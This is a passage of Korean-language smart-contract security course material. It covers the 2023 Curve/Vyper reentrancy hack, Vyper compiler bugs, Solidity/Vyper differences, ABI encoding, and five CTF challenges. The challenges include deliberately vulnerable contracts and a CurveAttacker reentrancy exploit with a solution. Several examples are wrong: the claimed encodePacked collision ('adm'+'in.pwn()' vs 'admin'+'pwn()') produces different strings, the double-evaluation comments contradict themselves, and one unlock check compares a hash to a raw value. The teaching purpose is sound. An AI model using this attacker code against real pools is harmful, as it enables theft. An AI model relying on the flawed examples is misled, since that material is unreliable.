
#### Curve Finance 해킹 사례 (2023년 7월)

```
날짜: 2023년 7월 30일
피해 규모: 약 $70M (최종 약 $52M, 일부 화이트햇이 반환)

영향받은 풀:
- alETH/ETH (Alchemix)
- pETH/ETH (JPEG'd)
- msETH/ETH (Metronome)
- CRV/ETH (Curve 자체 풀)

취약한 Vyper 버전: v0.2.15, v0.2.16, v0.3.0
영향받은 기능: add_liquidity와 remove_liquidity 간의 재진입

공격 타임라인:
- 07:00 UTC: 첫 번째 공격 트랜잭션 (alETH 풀)
- 07:00-12:00: 연속 공격
- 12:00: 화이트햇 및 MEV 봇이 선제적 추출 시작
- 이후 며칠: 일부 공격자가 자금 반환

공격 메커니즘:
1. remove_liquidity 호출 시작
2. ETH 수신 콜백에서 add_liquidity 재호출
3. @nonreentrant lock이 제대로 작동하지 않아 재진입 허용
4. 가격 조작 후 차익 실현

교훈:
- 컴파일러 자체도 신뢰할 수 없음
- Vyper 버전 명시적 고정 필요
- 동적 배열을 포함한 재진입 벡터 전체 분석 필요
```

#### 안전한 Vyper 버전 확인

```python
# 안전한 버전: v0.3.1 이상 (해당 버그 수정)
# 또는 v0.2.14 이하

# vyper --version으로 버전 확인
# 감사 시 항상 @version 프라그마 확인

# @version 0.3.1  ← 안전
# @version 0.3.0  ← 취약
# @version 0.2.16 ← 취약
# @version 0.2.15 ← 취약
# @version 0.2.14 ← 안전 (이 버그는 없음)
```

---

### 2.2 이중 평가 버그 (Double Evaluation)

사이드이펙트가 있는 표현식이 컴파일러에 의해 두 번 평가되는 버그다. Vyper 컴파일러 CVE 클러스터에서 가장 많은 취약점을 야기했다.

#### 버그 메커니즘

```python
# @version 0.2.x (일부 버전)

# 이중 평가 버그: sideeffect()가 두 번 호출될 수 있음
# 예: 반환값이 달라지는 상태 변경 함수

counter: uint256

@internal
def increment_and_get() -> uint256:
    self.counter += 1
    return self.counter

@external
def vulnerable_function():
    # 컴파일러가 increment_and_get()을 두 번 평가할 수 있음
    # 결과: counter가 1 증가해야 하지만 2 증가
    x: uint256 = self.increment_and_get() + self.increment_and_get()
    # 의도: x = 1 + 2 = 3, counter = 2
    # 버그: x = 2 + 2 = 4, counter = 2 (또는 다른 예상치 못한 결과)
```

#### 실제 취약점 패턴

```python
# @version 0.3.0 (취약)

balances: HashMap[address, uint256]
total_supply: uint256

@internal
def _burn(account: address, amount: uint256) -> uint256:
    # 사이드이펙트: 상태 변경
    self.balances[account] -= amount
    self.total_supply -= amount
    return self.balances[account]

@external
def compound_burn(account: address, amount: uint256):
    # _burn이 두 번 평가될 경우 amount가 두 번 차감
    remaining: uint256 = self._burn(account, amount)
    # ... 이후 로직
```

---

### 2.3 평가 순서 문제

#### 증강 할당의 위험

```python
# @version 0.3.x

array: uint256[10]
index: uint256

@internal
def get_and_increment() -> uint256:
    current: uint256 = self.index
    self.index += 1
    return current

@external
def problematic():
    # a[f()] += 1 패턴
    # 평가 순서가 구현마다 다를 수 있음:
    # (1) f() 먼저: idx = f(), array[idx] = array[idx] + 1
    # (2) RHS 먼저: val = array[?] + 1, idx = f(), array[idx] = val

    self.array[self.get_and_increment()] += 1
    # 버그 버전: get_and_increment()가 두 번 호출될 수 있음
    # → 다른 인덱스가 수정됨
```

#### 내장 함수 인자 평가 순서

```python
# @version 0.2.x

pending_operations: DynArray[uint256, 100]

@internal
def pop_operation() -> uint256:
    op: uint256 = self.pending_operations[len(self.pending_operations) - 1]
    self.pending_operations.pop()
    return op

@external
def process():
    # raw_call 인자 평가 순서 불확실
    # 만약 두 인자가 다른 순서로 평가되면:
    raw_call(
        convert(self.pop_operation(), address),  # 인자 1: pop 수행
        concat(b"\x00\x00\x00\x00", convert(self.pop_operation(), bytes32))  # 인자 2: 다시 pop
    )
    # 의도: 마지막 두 작업을 순서대로 처리
    # 버그: 평가 순서에 따라 다른 작업이 처리됨
```

---

### 2.4 Vyper가 제거한 Solidity 취약점 클래스

Vyper는 명시적인 설계 결정을 통해 여러 Solidity 취약점 클래스를 제거했다.

#### 1. 상속 없음 → C3 선형화 문제 제거

```solidity
// Solidity: 다중 상속의 C3 선형화 문제
// 어떤 함수가 호출되는지 예측하기 어려울 수 있음
contract A {
    function foo() virtual public returns (string memory) { return "A"; }
}
contract B is A {
    function foo() virtual override public returns (string memory) { return "B"; }
}
contract C is A {
    function foo() virtual override public returns (string memory) { return "C"; }
}
contract D is B, C { // B.foo가 호출됨 (C3 선형화: D→B→C→A)
    // 감사하지 않으면 어떤 foo()가 호출될지 모를 수 있음
}
```

```python
# Vyper: 상속 없음, 명시적 인터페이스만 허용
# @version 0.3.10

# implements: ERC20 (인터페이스 구현 선언)

@external
def transfer(_to: address, _value: uint256) -> bool:
    # 단일 구현, 모호성 없음
    ...
    return True
```

#### 2. 재귀 없음

```python
# Vyper는 재귀 함수를 허용하지 않음
# 컴파일 타임에 최대 호출 깊이를 결정 가능
# → 스택 오버플로우 공격 불가

# @version 0.3.10
# 이 코드는 컴파일 오류 발생:
@internal
def factorial(n: uint256) -> uint256:
    if n == 0:
        return 1
    return n * self.factorial(n - 1)  # 오류: 재귀 불가
```

#### 3. 인라인 어셈블리 없음

```python
# Vyper는 0.3.x까지 인라인 어셈블리를 허용하지 않음
# → 낮은 수준의 스토리지 조작이나 EVM 트릭 불가
# → 대부분의 어셈블리 기반 공격 불가

# 0.4.0부터 제한적으로 허용 (Snekmate 등의 요구)
# 하지만 strict 모드에서는 여전히 제한

# Solidity의 위험한 패턴이 Vyper에서 불가능:
# assembly { sstore(0, caller()) }  ← Vyper에서 불가
# assembly { calldatacopy(0, 0, calldatasize()) }  ← Vyper에서 불가
```

#### 4. explicit uses/initializes/exports 시스템 (0.4.0)

```python
# @version 0.4.0

# 모듈 시스템: 어떤 모듈의 무엇을 사용하는지 명시
from . import ownable

# initializes: 모듈 초기화 책임 명시
initializes: ownable

# uses: 모듈 상태에 접근하지만 초기화 책임 없음
# uses: ownable

# exports: 외부에 노출할 함수 명시
exports: (
    ownable.transfer_ownership,
    ownable.owner,
)

@deploy
def __init__():
    ownable.__init__()  # 명시적 초기화 필수
```

---

### 2.5 기타 Vyper 취약점

#### 빈 문자열 nonreentrant key

```python
# 취약한 패턴: 빈 문자열 키 사용
@external
@nonreentrant("")  # 빈 문자열 키
def withdraw():
    ...

@external
@nonreentrant("")  # 같은 빈 문자열 키 - 같은 락 슬롯 사용?
def deposit():
    ...

# 일부 버전에서 빈 문자열이 특별하게 처리되어
# 락이 공유되지 않을 수 있음
# 항상 명시적인 의미있는 키 사용 권장:
# @nonreentrant("withdraw_lock")
# @nonreentrant("deposit_lock")
```

#### default 함수에서 nonreentrancy 미적용 (v0.3.0 이전)

```python
# @version 0.2.x

balances: HashMap[address, uint256]

@external
@nonreentrant("lock")
def withdraw(_amount: uint256):
    assert self.balances[msg.sender] >= _amount
    self.balances[msg.sender] -= _amount
    send(msg.sender, _amount)

# 취약: default/fallback 함수에 @nonreentrant 적용 불가
@external
def __default__():
    # 이 함수에서 withdraw를 재진입할 수 있음!
    # v0.3.0 이전에는 __default__에 @nonreentrant 적용 어려움
    pass
```

#### Side Effect Elision

```python
# 컴파일러가 "불필요한" 사이드이펙트를 제거할 수 있는 버그
# 주로 최적화 관련 버그

# 예: 결과가 사용되지 않는 함수 호출이 제거됨
@internal
def log_access(account: address) -> bool:
    # 이 함수의 결과가 사용되지 않으면 컴파일러가 제거할 수 있음
    self.access_log[account] = True
    return True

@external
def check_access(account: address):
    # 버그 버전: log_access가 제거될 수 있음
    self.log_access(account)  # 반환값 무시
    # ... 이후 로직
```

---

## 3. 실습: Solidity vs Vyper 비교

### 3.1 동일 로직 구현 비교

#### ERC-20 토큰 구현

```solidity
// SPDX-License-Identifier: MIT
// Solidity ERC-20
pragma solidity ^0.8.20;

contract SolidityERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _initialSupply * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "잔액 부족");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "잔액 부족");
        require(allowance[from][msg.sender] >= amount, "허용량 부족");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
```

```python
# @version 0.3.10
# Vyper ERC-20

from vyper.interfaces import ERC20

implements: ERC20

name: public(String[64])
symbol: public(String[32])
decimals: public(uint8)
totalSupply: public(uint256)

balanceOf: public(HashMap[address, uint256])
allowance: public(HashMap[address, HashMap[address, uint256]])

event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    value: uint256

@deploy
def __init__(_name: String[64], _symbol: String[32], _initial_supply: uint256):
    self.name = _name
    self.symbol = _symbol
    self.decimals = 18
    self.totalSupply = _initial_supply * 10 ** 18
    self.balanceOf[msg.sender] = self.totalSupply
    log Transfer(empty(address), msg.sender, self.totalSupply)

@external
def transfer(_to: address, _value: uint256) -> bool:
    assert self.balanceOf[msg.sender] >= _value, "잔액 부족"
    self.balanceOf[msg.sender] -= _value
    self.balanceOf[_to] += _value
    log Transfer(msg.sender, _to, _value)
    return True

@external
def approve(_spender: address, _value: uint256) -> bool:
    self.allowance[msg.sender][_spender] = _value
    log Approval(msg.sender, _spender, _value)
    return True

@external
def transferFrom(_from: address, _to: address, _value: uint256) -> bool:
    assert self.balanceOf[_from] >= _value, "잔액 부족"
    assert self.allowance[_from][msg.sender] >= _value, "허용량 부족"
    self.allowance[_from][msg.sender] -= _value
    self.balanceOf[_from] -= _value
    self.balanceOf[_to] += _value
    log Transfer(_from, _to, _value)
    return True
```

#### 언어 차이 분석

```
비교 항목             | Solidity          | Vyper
---------------------|-------------------|-----------------
상속                 | 가능              | 불가
modifier             | 가능              | 불가 (@nonreentrant 등 데코레이터만)
인라인 어셈블리      | 가능              | 제한적 (0.4.0+)
재귀                 | 가능              | 불가
함수 오버로딩        | 가능              | 불가
연산자 오버로딩      | 불가              | 불가
동적 배열 생성       | new Type[](n)     | DynArray[Type, MAX]
이벤트 로깅          | emit Event(...)   | log Event(...)
생성자               | constructor()     | @deploy def __init__()
폴백 함수            | fallback()        | __default__()
```

### 3.2 ABI 인코딩 수동 실습

#### 함수 셀렉터 계산

```python
# Python으로 함수 셀렉터 직접 계산
from eth_hash.auto import keccak

def compute_selector(signature: str) -> str:
    """함수 시그니처로 4바이트 셀렉터 계산"""
    sig_bytes = signature.encode('utf-8')
    full_hash = keccak(sig_bytes)
    selector = full_hash[:4]
    return f"0x{selector.hex()}"

# 일반적인 함수들의 셀렉터
print(compute_selector("transfer(address,uint256)"))
# 0xa9059cbb

print(compute_selector("transferFrom(address,address,uint256)"))
# 0x23b872dd

print(compute_selector("approve(address,uint256)"))
# 0x095ea7b3

print(compute_selector("balanceOf(address)"))
# 0x70a08231

# 이벤트는 토픽[0]으로 사용됨 (전체 32바이트)
def compute_event_topic(signature: str) -> str:
    sig_bytes = signature.encode('utf-8')
    full_hash = keccak(sig_bytes)
    return f"0x{full_hash.hex()}"

print(compute_event_topic("Transfer(address,address,uint256)"))
# 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
```

#### 전체 calldata 수동 인코딩/디코딩

```python
from eth_abi import encode, decode
from eth_hash.auto import keccak

def encode_function_call(signature: str, types: list, values: list) -> bytes:
    """함수 호출 calldata 인코딩"""
    selector = keccak(signature.encode())[:4]
    encoded_params = encode(types, values)
    return selector + encoded_params

def decode_function_call(calldata: bytes, types: list):
    """calldata 디코딩 (셀렉터 제외)"""
    return decode(types, calldata[4:])

# 예시: transfer(address, uint256) 호출
calldata = encode_function_call(
    "transfer(address,uint256)",
    ["address", "uint256"],
    ["0xABCDEF1234567890ABcDEF1234567890ABcDeF12", 1000 * 10**18]
)

print(f"Calldata: 0x{calldata.hex()}")
print(f"길이: {len(calldata)} bytes")
# Calldata: 0xa9059cbb000000000000000000000000abcdef1234567890abcdef1234567890abcdef12
#           0000000000000000000000000000000000000000000000056bc75e2d63100000

# 디코딩
to_address, amount = decode_function_call(calldata, ["address", "uint256"])
print(f"to: {to_address}")
print(f"amount: {amount}")
```

---

## 4. CTF 연습 문제

### 문제 1: Panic 코드 수집기

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 목표: 5가지 다른 Panic 코드를 트리거하고 각각의 revert 데이터를 수집하라.
 * 요구사항:
 * - Panic(0x01), Panic(0x11), Panic(0x12), Panic(0x31), Panic(0x32) 트리거
 * - 각각의 revert 데이터를 off-chain에서 디코딩
 */
contract PanicCollector {
    uint8 public smallNum;
    uint256[] public dynamicArr;
    uint256[3] public fixedArr;

    function triggerTarget(uint256 panicCode, bytes calldata input) external {
        // 힌트: panicCode에 따라 다른 함수를 호출해야 함
    }
}

// 풀이 접근법:
// 1. cast call을 사용하여 각 함수 직접 호출
// 2. revert 데이터에서 Panic 코드 추출
// 3. 0x4e487b71 셀렉터 확인 후 uint256 디코딩
```

### 문제 2: Private 비밀 해독

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 목표: 컨트랙트의 private 비밀 3개를 모두 찾아 unlock() 함수를 호출하라.
 */
contract SecretVault {
    bool private locked = true;                    // 슬롯 0
    uint256 private secret1 = 0xDEADBEEF;         // 슬롯 1
    address private owner;                          // 슬롯 2
    bytes32[10] private data;                       // 슬롯 3-12
    mapping(address => bytes32) private passwords;  // 슬롯 13

    constructor() {
        owner = msg.sender;
        // 배포자 주소의 패스워드 설정
        passwords[msg.sender] = keccak256(abi.encode(secret1, block.timestamp));
    }

    function unlock(uint256 _secret1, bytes32 _password) external {
        require(uint256(keccak256(abi.encode(_secret1))) == uint256(secret1), "비밀번호 1 틀림");
        require(passwords[msg.sender] == _password, "패스워드 틀림");
        locked = false;
    }

    function isUnlocked() external view returns (bool) {
        return !locked;
    }
}

// 힌트:
// 1. eth_getStorageAt으로 각 슬롯 읽기
// 2. 매핑은 keccak256(abi.encode(key, slot))으로 스토리지 위치 계산
// 3. 배포 트랜잭션을 분석하여 block.timestamp 획득
```

### 문제 3: unchecked 트레저리

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 목표: 초기 잔액 0에서 시작하여 1000 ether의 토큰을 탈취하라.
 * 제약: 이더는 없음, 다른 계정에서 토큰을 훔칠 수 없음.
 */
contract UncheckedTreasury {
    mapping(address => uint256) public balances;
    address public treasury;
    uint256 public TREASURY_AMOUNT = 1000 ether;

    constructor() {
        treasury = address(this);
        balances[treasury] = TREASURY_AMOUNT;
    }

    function buy(uint256 amount) external payable {
        require(msg.value == amount / 1000, "1000 wei per token");
        balances[msg.sender] += amount;
    }

    // 취약점 찾기: 어디서 unchecked 오버플로우가 발생하는가?
    function redeem(uint256 amount) external {
        unchecked {
            require(balances[msg.sender] >= amount, "잔액 부족");
            balances[msg.sender] -= amount;
            balances[treasury] += amount;
        }
    }

    // 추가 취약점: 이 함수에도 문제가 있음
    function transferToVIP(address vip, uint256 bonusMultiplier) external {
        require(bonusMultiplier <= 10, "최대 10x");
        uint256 bonus;
        unchecked {
            bonus = balances[msg.sender] * bonusMultiplier;
        }
        balances[vip] += bonus;
        // 이 함수의 문제점은?
    }
}

// 풀이:
// transferToVIP에서 bonus 계산 시 오버플로우로 bonus = 0 or 매우 큰 값
// → bonus = type(uint256).max 등 획득 가능
```

### 문제 4: ABI 혼동 공격

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 목표: 서명 없이 admin 함수를 호출하라.
 * 힌트: abi.encodePacked의 해시 충돌을 이용하라.
 */
contract SignatureChallenge {
    mapping(bytes32 => bool) public used;
    address public signer;
    bool public pwned = false;

    constructor(address _signer) {
        signer = _signer;
    }

    function callMe(
        string calldata target,
        string calldata method,
        bytes calldata signature
    ) external {
        bytes32 hash = keccak256(abi.encodePacked(target, method));
        require(!used[hash], "이미 사용됨");

        bytes32 ethHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
        );
        require(_recover(ethHash, signature) == signer, "유효하지 않은 서명");

        used[hash] = true;

        if (keccak256(bytes(method)) == keccak256(bytes("pwn()"))) {
            if (keccak256(bytes(target)) == keccak256(bytes("admin"))) {
                pwned = true;
            }
        }
    }

    // 합법적인 서명 요청: target="adm", method="in.pwn()"
    // 공격: target="admin", method="pwn()" 으로 같은 서명 재사용

    function _recover(bytes32 hash, bytes calldata sig) internal pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(sig.offset)
            s := calldataload(add(sig.offset, 32))
            v := byte(0, calldataload(add(sig.offset, 64)))
        }
        return ecrecover(hash, v, r, s);
    }
}
```

### 문제 5: Vyper 재진입 시뮬레이션

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Curve Finance 해킹 패턴을 시뮬레이션한 CTF
 * 목표: add_liquidity와 remove_liquidity 간의 재진입으로 풀의 잔액을 탈취하라.
 *
 * 참고: 실제 Curve 해킹은 Vyper 컴파일러 버그였지만,
 * 이 CTF는 같은 패턴을 Solidity로 시뮬레이션
 */
contract VulnerablePool {
    mapping(address => uint256) public lpBalances;
    uint256 public totalLiquidity;
    bool private locked = false; // 버그: add와 remove에 같은 락이 적용되어야 하지만...

    bool public addLocked = false;    // add_liquidity용 락
    bool public removeLocked = false; // remove_liquidity용 락 (별개!)
    // 취약점: 두 락이 독립적 → 교차 재진입 가능

    function add_liquidity() external payable {
        require(!addLocked, "reentrant");
        addLocked = true;

        lpBalances[msg.sender] += msg.value;
        totalLiquidity += msg.value;

        addLocked = false;
    }

    function remove_liquidity(uint256 amount) external {
        require(!removeLocked, "reentrant");
        removeLocked = true;

        require(lpBalances[msg.sender] >= amount, "잔액 부족");

        // ETH 전송 (재진입 포인트)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        lpBalances[msg.sender] -= amount; // 전송 후 상태 업데이트 (CEI 위반)
        totalLiquidity -= amount;

        removeLocked = false;
    }
}

// 공격 컨트랙트
contract CurveAttacker {
    VulnerablePool public pool;
    uint256 public attackAmount;
    uint256 public count;

    constructor(address _pool) {
        pool = VulnerablePool(_pool);
    }

    function attack() external payable {
        attackAmount = msg.value;
        pool.add_liquidity{value: msg.value}();
        pool.remove_liquidity(attackAmount);
    }

    receive() external payable {
        if (count < 3 && address(pool).balance >= attackAmount) {
            count++;
            // remove_liquidity 중 add_liquidity 호출 가능! (다른 락이므로)
            pool.add_liquidity{value: msg.value}();
            // 또는 remove_liquidity 재귀 호출 시도
        }
    }
}

// 풀이:
// 1. remove_liquidity 호출 시작 (removeLocked = true)
// 2. ETH 수신 콜백 (receive)에서 add_liquidity 호출 (addLocked = false이므로 허용)
// 3. add_liquidity에서 lpBalances[attacker] += amount (다시 증가)
// 4. remove_liquidity 완료 후 lpBalances[attacker] -= amount (두 번 더 출금 가능)
```

---

## 5. 참고 자료

### 공식 문서

| 자료 | 링크 | 설명 |
|------|------|------|
| Solidity 문서 | https://docs.soliditylang.org | 공식 언어 레퍼런스 |
| Vyper 문서 | https://docs.vyperlang.org | 공식 Vyper 레퍼런스 |
| Solidity ABI 사양 | https://docs.soliditylang.org/en/latest/abi-spec.html | ABI 인코딩 공식 사양 |
| EVM 옵코드 레퍼런스 | https://www.evm.codes | EVM 명령어 가스 비용 |

### EIP 레퍼런스

| EIP | 제목 | 관련 내용 |
|-----|------|----------|
| EIP-6049 | Deprecate SELFDESTRUCT | selfdestruct 폐기 예고 |
| EIP-6780 | SELFDESTRUCT only in same transaction | selfdestruct 제한 (Dencun) |
| EIP-2929 | Gas cost increases for state access opcodes | SLOAD/SSTORE 가스 증가 → send/transfer 문제 |
| EIP-3529 | Reduction in refunds | 가스 환불 감소 |
| EIP-4758 | Deactivate SELFDESTRUCT | selfdestruct 향후 완전 폐기 |

### 보안 관련 자료

| 자료 | 설명 |
|------|------|
| [Vyper Compiler Bugs (GitHub)](https://github.com/vyperlang/vyper/security/advisories) | Vyper 공식 보안 공지 |
| [Curve Finance Hack Analysis (BlockSec)](https://blocksec.com/blog/an-analysis-of-the-curve-re-entrancy-hack) | Curve 해킹 상세 분석 |
| [SWC Registry](https://swcregistry.io) | Solidity 취약점 분류 |
| [Rekt News](https://rekt.news) | 주요 해킹 사례 데이터베이스 |
| [ABI Encoding Demystified](https://degatchi.com/articles/reading-raw-evm-calldata) | ABI 인코딩 심층 분석 |

### 도구

| 도구 | 용도 |
|------|------|
| `cast storage <addr> <slot>` | Foundry로 스토리지 슬롯 읽기 |
| `cast decode-calldata` | calldata 디코딩 |
| `cast sig <sig>` | 함수 셀렉터 계산 |
| `vyper -f ir contract.vy` | Vyper IR 출력 (컴파일러 분석) |
| `solc --storage-layout` | Solidity 스토리지 레이아웃 출력 |
| `slither` | Solidity 정적 분석 |
| `mythril` | Solidity 심볼릭 실행 |

### 추가 학습 경로

```
Phase 2 완료 후 권장 심화 학습:

1. Solidity 컴파일러 소스 분석
   → github.com/ethereum/solidity (libsolidity/)
   → yul 중간 표현 이해

2. Vyper 컴파일러 CVE 전체 목록 분석
   → github.com/vyperlang/vyper/security/advisories
   → 각 CVE별 취약 코드 재현 실습

3. EVM 바이트코드 수동 분석
   → decompiler: panoramix, heimdall
   → 컴파일된 바이트코드에서 취약점 식별

4. Foundry를 이용한 PoC 자동화
   → forge test로 모든 CTF 문제 테스트
   → invariant testing으로 수학적 취약점 탐지
```

---

> 이 자료는 Web3 보안 교육 목적으로 작성되었습니다.
> 모든 PoC 코드는 테스트 환경에서만 사용하십시오.
> Phase 3: 취약점 패턴 분석으로 이어집니다.
